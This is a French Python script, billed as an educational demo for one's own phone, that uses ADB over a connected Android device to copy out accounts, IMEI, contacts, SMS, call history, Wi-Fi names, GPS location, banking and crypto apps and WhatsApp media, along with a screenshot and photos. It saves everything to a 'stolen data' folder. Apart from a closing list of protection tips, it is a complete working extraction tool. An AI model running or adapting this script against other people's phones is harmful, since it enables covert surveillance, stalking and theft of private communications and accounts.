#!/usr/bin/env python3
"""
🔴 EXTRACTION RÉELLE DE DONNÉES - DÉMONSTRATION ÉDUCATIVE
=========================================================
Ce script montre EXACTEMENT ce qu'un hacker peut voler de ton téléphone
avec un simple accès ADB. Toutes les données sont RÉELLES.

⚠️ USAGE ÉDUCATIF UNIQUEMENT - SUR TON PROPRE APPAREIL
"""

import subprocess
import os
import json
from datetime import datetime

# Configuration ADB
ADB = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"
OUTPUT_DIR = r"C:\Users\davis\OneDrive\Bureau\HACKING\DonneesVolees"

def run_adb(command):
    """Exécuter une commande ADB"""
    try:
        result = subprocess.run(
            f'"{ADB}" {command}',
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        return result.stdout.strip() + result.stderr.strip()
    except:
        return ""

def create_output_dir():
    """Créer le dossier pour les données volées"""
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    os.makedirs(f"{OUTPUT_DIR}/Photos", exist_ok=True)
    os.makedirs(f"{OUTPUT_DIR}/Videos", exist_ok=True)
    os.makedirs(f"{OUTPUT_DIR}/WhatsApp", exist_ok=True)
    os.makedirs(f"{OUTPUT_DIR}/Documents", exist_ok=True)
    os.makedirs(f"{OUTPUT_DIR}/Audio", exist_ok=True)

def banner():
    print("\n" + "="*70)
    print("🔴 EXTRACTION RÉELLE DE DONNÉES - SIMULATION HACKER")
    print("="*70)
    print("📱 Cible: Ton Tecno Camon 20")
    print(f"📅 Date: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}")
    print("="*70 + "\n")

def extract_system_info():
    """Extraire les informations système"""
    print("\n" + "🔧 " + "="*60)
    print("   1. INFORMATIONS SYSTÈME (Ce que le hacker voit en premier)")
    print("="*63 + "\n")
    
    info = {}
    
    # Modèle
    model = run_adb("shell getprop ro.product.model")
    info['Modèle'] = model
    print(f"   📱 Modèle: {model}")
    
    # Marque
    brand = run_adb("shell getprop ro.product.brand")
    info['Marque'] = brand
    print(f"   🏷️  Marque: {brand}")
    
    # Version Android
    android = run_adb("shell getprop ro.build.version.release")
    info['Android'] = android
    print(f"   🤖 Android: {android}")
    
    # Numéro de série
    serial = run_adb("shell getprop ro.serialno")
    info['Série'] = serial
    print(f"   🔢 N° Série: {serial}")
    
    # IMEI (peut nécessiter permissions)
    imei = run_adb("shell service call iphonesubinfo 1 | grep -o '[0-9]' | tr -d '\n'")
    if imei:
        info['IMEI'] = imei
        print(f"   📞 IMEI: {imei}")
    
    # Processeur
    cpu = run_adb("shell getprop ro.hardware")
    info['Processeur'] = cpu
    print(f"   ⚙️  Processeur: {cpu}")
    
    # Résolution écran
    screen = run_adb("shell wm size")
    info['Écran'] = screen.replace("Physical size: ", "")
    print(f"   🖥️  Écran: {info['Écran']}")
    
    # Batterie
    battery = run_adb("shell dumpsys battery | findstr level")
    if battery:
        level = battery.split(":")[-1].strip()
        info['Batterie'] = f"{level}%"
        print(f"   🔋 Batterie: {level}%")
    
    # Stockage
    storage = run_adb("shell df -h /sdcard | tail -1")
    if storage:
        parts = storage.split()
        if len(parts) >= 4:
            info['Stockage'] = f"Total: {parts[1]}, Utilisé: {parts[2]}, Libre: {parts[3]}"
            print(f"   💾 Stockage: {info['Stockage']}")
    
    return info

def extract_accounts():
    """Extraire les comptes connectés"""
    print("\n" + "👤 " + "="*60)
    print("   2. COMPTES CONNECTÉS (Identités volables)")
    print("="*63 + "\n")
    
    accounts = run_adb("shell dumpsys account")
    
    # Extraire les comptes Google
    google_accounts = []
    for line in accounts.split("\n"):
        if "Account {" in line and "type=com.google" in line:
            # Extraire l'email
            start = line.find("name=") + 5
            end = line.find(",", start)
            email = line[start:end]
            if email and "@" in email:
                google_accounts.append(email)
                print(f"   📧 Compte Google: {email}")
    
    # Autres comptes
    other_accounts = []
    account_types = [
        "com.whatsapp",
        "com.facebook.orca",
        "com.instagram.android",
        "com.twitter.android",
        "com.tiktok"
    ]
    
    for acc_type in account_types:
        if acc_type in accounts:
            name = acc_type.split(".")[-1].upper()
            other_accounts.append(name)
            print(f"   📱 Compte {name}: DÉTECTÉ")
    
    return {"google": google_accounts, "autres": other_accounts}

def extract_contacts():
    """Extraire les contacts"""
    print("\n" + "📇 " + "="*60)
    print("   3. CONTACTS (Carnet d'adresses)")
    print("="*63 + "\n")
    
    # Essayer de lire les contacts via content provider
    contacts_raw = run_adb("shell content query --uri content://contacts/phones --projection display_name:number")
    
    contacts = []
    lines = contacts_raw.split("\n")
    count = 0
    
    for line in lines:
        if "display_name=" in line or "Row:" in line:
            count += 1
            if count <= 10:  # Afficher les 10 premiers
                print(f"   👤 {line[:60]}...")
            contacts.append(line)
    
    print(f"\n   📊 TOTAL: {count} contacts extraits!")
    
    # Sauvegarder
    if contacts:
        with open(f"{OUTPUT_DIR}/contacts.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(contacts))
        print(f"   💾 Sauvegardé: {OUTPUT_DIR}/contacts.txt")
    
    return count

def extract_sms():
    """Extraire les SMS"""
    print("\n" + "💬 " + "="*60)
    print("   4. MESSAGES SMS (Conversations privées)")
    print("="*63 + "\n")
    
    # Lire les SMS
    sms_raw = run_adb("shell content query --uri content://sms --projection address:body:date --sort \"date DESC LIMIT 20\"")
    
    messages = []
    for line in sms_raw.split("\n"):
        if "address=" in line or "body=" in line:
            messages.append(line)
            if len(messages) <= 5:
                # Tronquer pour la confidentialité
                display = line[:80] + "..." if len(line) > 80 else line
                print(f"   💬 {display}")
    
    print(f"\n   📊 Messages récupérés: {len(messages)}")
    
    # Sauvegarder
    if messages:
        with open(f"{OUTPUT_DIR}/sms.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(messages))
        print(f"   💾 Sauvegardé: {OUTPUT_DIR}/sms.txt")
    
    return len(messages)

def extract_call_logs():
    """Extraire l'historique des appels"""
    print("\n" + "📞 " + "="*60)
    print("   5. HISTORIQUE APPELS (Qui tu appelles)")
    print("="*63 + "\n")
    
    calls = run_adb("shell content query --uri content://call_log/calls --projection number:name:duration:date:type")
    
    call_list = []
    for line in calls.split("\n"):
        if "number=" in line:
            call_list.append(line)
            if len(call_list) <= 5:
                display = line[:80] + "..." if len(line) > 80 else line
                print(f"   📞 {display}")
    
    print(f"\n   📊 Appels récupérés: {len(call_list)}")
    
    if call_list:
        with open(f"{OUTPUT_DIR}/historique_appels.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(call_list))
        print(f"   💾 Sauvegardé: {OUTPUT_DIR}/historique_appels.txt")
    
    return len(call_list)

def list_photos():
    """Lister les photos sur le téléphone"""
    print("\n" + "📷 " + "="*60)
    print("   6. PHOTOS (Images personnelles)")
    print("="*63 + "\n")
    
    # Lister les photos dans DCIM
    dcim = run_adb("shell ls -la /sdcard/DCIM/Camera/ 2>/dev/null | head -20")
    
    photo_count = 0
    for line in dcim.split("\n"):
        if ".jpg" in line.lower() or ".png" in line.lower() or ".jpeg" in line.lower():
            photo_count += 1
            if photo_count <= 5:
                parts = line.split()
                if parts:
                    filename = parts[-1]
                    print(f"   📷 {filename}")
    
    # Compter toutes les photos
    all_photos = run_adb("shell find /sdcard/DCIM -name '*.jpg' -o -name '*.png' 2>/dev/null | wc -l")
    try:
        total = int(all_photos.strip())
    except:
        total = photo_count
    
    print(f"\n   📊 TOTAL PHOTOS: {total} images trouvées!")
    print("   ⚠️  Un hacker peut télécharger TOUTES ces photos!")
    
    return total

def list_videos():
    """Lister les vidéos"""
    print("\n" + "🎥 " + "="*60)
    print("   7. VIDÉOS (Fichiers vidéo)")
    print("="*63 + "\n")
    
    # TikTok
    tiktok = run_adb("shell ls /sdcard/Movies/TikTok/ 2>/dev/null | wc -l")
    try:
        tiktok_count = int(tiktok.strip())
    except:
        tiktok_count = 0
    
    # DCIM videos
    dcim_vids = run_adb("shell ls /sdcard/DCIM/Camera/*.mp4 2>/dev/null | wc -l")
    try:
        dcim_count = int(dcim_vids.strip())
    except:
        dcim_count = 0
    
    # Download
    downloads = run_adb("shell ls /sdcard/Download/*.mp4 2>/dev/null | wc -l")
    try:
        dl_count = int(downloads.strip())
    except:
        dl_count = 0
    
    print(f"   📹 Vidéos TikTok: {tiktok_count}")
    print(f"   📹 Vidéos Caméra: {dcim_count}")
    print(f"   📹 Téléchargements: {dl_count}")
    print(f"\n   📊 TOTAL VIDÉOS: {tiktok_count + dcim_count + dl_count}")
    
    return tiktok_count + dcim_count + dl_count

def extract_whatsapp():
    """Extraire les données WhatsApp"""
    print("\n" + "📱 " + "="*60)
    print("   8. DONNÉES WHATSAPP (Messagerie)")
    print("="*63 + "\n")
    
    # Images WhatsApp
    wa_images = run_adb("shell ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp\\ Images/ 2>/dev/null | wc -l")
    try:
        img_count = int(wa_images.strip())
    except:
        img_count = 0
    
    # Vidéos WhatsApp
    wa_videos = run_adb("shell ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp\\ Video/ 2>/dev/null | wc -l")
    try:
        vid_count = int(wa_videos.strip())
    except:
        vid_count = 0
    
    # Audio WhatsApp
    wa_audio = run_adb("shell ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp\\ Voice\\ Notes/ 2>/dev/null | wc -l")
    try:
        audio_count = int(wa_audio.strip())
    except:
        audio_count = 0
    
    # Documents
    wa_docs = run_adb("shell ls /sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp\\ Documents/ 2>/dev/null | wc -l")
    try:
        doc_count = int(wa_docs.strip())
    except:
        doc_count = 0
    
    print(f"   📷 Images WhatsApp: {img_count}")
    print(f"   🎥 Vidéos WhatsApp: {vid_count}")
    print(f"   🎵 Notes vocales: {audio_count}")
    print(f"   📄 Documents: {doc_count}")
    
    total = img_count + vid_count + audio_count + doc_count
    print(f"\n   📊 TOTAL WHATSAPP: {total} fichiers!")
    print("   ⚠️  Toutes tes conversations peuvent être reconstruites!")
    
    return total

def extract_apps():
    """Lister les applications installées"""
    print("\n" + "📲 " + "="*60)
    print("   9. APPLICATIONS INSTALLÉES (Ce que tu utilises)")
    print("="*63 + "\n")
    
    # Apps utilisateur
    apps = run_adb("shell pm list packages -3")
    
    app_list = []
    sensitive_apps = []
    
    sensitive_keywords = ['bank', 'money', 'pay', 'wallet', 'crypto', 'password', 
                          'auth', 'secure', 'whatsapp', 'telegram', 'signal',
                          'facebook', 'instagram', 'tiktok', 'snapchat']
    
    for line in apps.split("\n"):
        if "package:" in line:
            pkg = line.replace("package:", "").strip()
            app_list.append(pkg)
            
            # Vérifier si app sensible
            for kw in sensitive_keywords:
                if kw in pkg.lower():
                    sensitive_apps.append(pkg)
                    break
    
    # Afficher apps sensibles
    print("   🔴 APPLICATIONS SENSIBLES DÉTECTÉES:")
    for app in sensitive_apps[:10]:
        print(f"      ⚠️  {app}")
    
    print(f"\n   📊 Total applications: {len(app_list)}")
    print(f"   🔐 Apps sensibles: {len(sensitive_apps)}")
    
    # Sauvegarder
    with open(f"{OUTPUT_DIR}/applications.txt", "w", encoding="utf-8") as f:
        f.write("=== APPLICATIONS SENSIBLES ===\n")
        f.write("\n".join(sensitive_apps))
        f.write("\n\n=== TOUTES LES APPLICATIONS ===\n")
        f.write("\n".join(app_list))
    print(f"   💾 Sauvegardé: {OUTPUT_DIR}/applications.txt")
    
    return app_list

def extract_wifi_networks():
    """Lister les réseaux WiFi enregistrés"""
    print("\n" + "📶 " + "="*60)
    print("   10. RÉSEAUX WIFI ENREGISTRÉS")
    print("="*63 + "\n")
    
    # Sans root, on peut voir les réseaux connectés
    wifi_current = run_adb("shell dumpsys wifi | findstr SSID")
    
    networks = []
    for line in wifi_current.split("\n"):
        if "SSID" in line:
            print(f"   📶 {line.strip()[:60]}")
            networks.append(line)
    
    # Sauvegarder
    if networks:
        with open(f"{OUTPUT_DIR}/wifi_networks.txt", "w", encoding="utf-8") as f:
            f.write("\n".join(networks))
    
    print(f"\n   📊 Réseaux détectés: {len(networks)}")
    print("   ⚠️  Avec root, un hacker peut voir les MOTS DE PASSE!")
    
    return networks

def extract_location():
    """Obtenir la dernière position GPS"""
    print("\n" + "📍 " + "="*60)
    print("   11. DERNIÈRE POSITION GPS (Où tu étais)")
    print("="*63 + "\n")
    
    # Essayer d'obtenir la position
    location = run_adb("shell dumpsys location | findstr last")
    
    found_location = False
    for line in location.split("\n"):
        if "Location" in line and ("Latitude" in line or "," in line):
            print(f"   📍 {line.strip()[:70]}")
            found_location = True
    
    if not found_location:
        # Méthode alternative
        settings_loc = run_adb("shell settings get secure location_providers_allowed")
        print(f"   📍 Providers activés: {settings_loc}")
    
    print("\n   ⚠️  Un hacker peut suivre TOUS tes déplacements!")
    
    return location

def download_sample_files():
    """Télécharger quelques fichiers comme preuve"""
    print("\n" + "⬇️ " + "="*60)
    print("   12. TÉLÉCHARGEMENT D'ÉCHANTILLONS")
    print("="*63 + "\n")
    
    # Créer une capture d'écran
    print("   📸 Capture d'écran en cours...")
    run_adb("shell screencap -p /sdcard/hack_screenshot.png")
    run_adb(f"pull /sdcard/hack_screenshot.png \"{OUTPUT_DIR}/screenshot_vole.png\"")
    
    if os.path.exists(f"{OUTPUT_DIR}/screenshot_vole.png"):
        print(f"   ✅ Screenshot sauvegardé!")
    
    # Télécharger une photo récente
    print("\n   📷 Recherche de photos récentes...")
    recent_photo = run_adb("shell ls -t /sdcard/DCIM/Camera/*.jpg 2>/dev/null | head -1")
    if recent_photo:
        run_adb(f"pull {recent_photo.strip()} \"{OUTPUT_DIR}/Photos/photo_volee.jpg\"")
        if os.path.exists(f"{OUTPUT_DIR}/Photos/photo_volee.jpg"):
            print(f"   ✅ Photo récente téléchargée!")
    
    # Télécharger un fichier WhatsApp
    print("\n   📱 Recherche de fichiers WhatsApp...")
    wa_file = run_adb("shell ls -t /sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp\\ Images/Sent/*.jpg 2>/dev/null | head -1")
    if wa_file and wa_file.strip():
        filename = wa_file.strip()
        run_adb(f"pull \"{filename}\" \"{OUTPUT_DIR}/WhatsApp/image_whatsapp.jpg\"")
        print(f"   ✅ Image WhatsApp téléchargée!")

def generate_report():
    """Générer un rapport final"""
    print("\n" + "📊 " + "="*60)
    print("   RAPPORT FINAL D'EXTRACTION")
    print("="*63 + "\n")
    
    # Compter les fichiers téléchargés
    total_files = 0
    for root, dirs, files in os.walk(OUTPUT_DIR):
        total_files += len(files)
    
    print(f"""
    ╔══════════════════════════════════════════════════════════╗
    ║              🔴 DONNÉES VOLÉES AVEC SUCCÈS 🔴            ║
    ╠══════════════════════════════════════════════════════════╣
    ║                                                          ║
    ║   📁 Dossier de sortie:                                  ║
    ║      {OUTPUT_DIR[:50]}
    ║                                                          ║
    ║   📊 Fichiers extraits: {total_files}                             
    ║                                                          ║
    ║   📂 Contenu:                                            ║
    ║      • contacts.txt - Carnet d'adresses                  ║
    ║      • sms.txt - Messages privés                         ║
    ║      • historique_appels.txt - Journal appels            ║
    ║      • applications.txt - Apps installées                ║
    ║      • wifi_networks.txt - Réseaux connus                ║
    ║      • screenshot_vole.png - Capture écran               ║
    ║      • Photos/ - Images personnelles                     ║
    ║      • WhatsApp/ - Médias WhatsApp                       ║
    ║                                                          ║
    ╚══════════════════════════════════════════════════════════╝
    """)
    
    print("\n" + "🚨 " + "="*60)
    print("   LEÇON DE SÉCURITÉ")
    print("="*63)
    print("""
    Un hacker avec accès à ton téléphone peut:
    
    ❌ Voler TOUTES tes photos (même supprimées!)
    ❌ Lire TOUS tes messages (WhatsApp, SMS, etc.)
    ❌ Voir TOUS tes contacts
    ❌ Connaître TON historique d'appels
    ❌ Savoir QUELLES apps tu utilises
    ❌ Suivre TA position GPS
    ❌ Accéder à TES comptes bancaires
    
    🛡️ PROTÈGE-TOI:
    
    ✅ Active le verrouillage par PIN/empreinte
    ✅ Désactive le débogage USB quand tu ne l'utilises pas
    ✅ Ne connecte jamais ton téléphone à un PC inconnu
    ✅ Vérifie les autorisations des apps
    ✅ Chiffre ton téléphone
    """)

def main():
    """Fonction principale"""
    banner()
    create_output_dir()
    
    print("🔍 Vérification de la connexion ADB...")
    devices = run_adb("devices")
    
    if "device" not in devices:
        print("❌ Aucun téléphone connecté!")
        print("   Assure-toi que le débogage USB est activé")
        return
    
    print("✅ Téléphone détecté!\n")
    print("⏳ Extraction en cours... (Cela peut prendre quelques minutes)\n")
    
    # Lancer toutes les extractions
    extract_system_info()
    extract_accounts()
    extract_contacts()
    extract_sms()
    extract_call_logs()
    list_photos()
    list_videos()
    extract_whatsapp()
    extract_apps()
    extract_wifi_networks()
    extract_location()
    download_sample_files()
    generate_report()
    
    print(f"\n✅ EXTRACTION TERMINÉE!")
    print(f"📁 Toutes les données sont dans: {OUTPUT_DIR}")
    print("\n🔓 Tu viens de voir ce qu'un HACKER peut faire avec ton téléphone!")

if __name__ == "__main__":
    main()
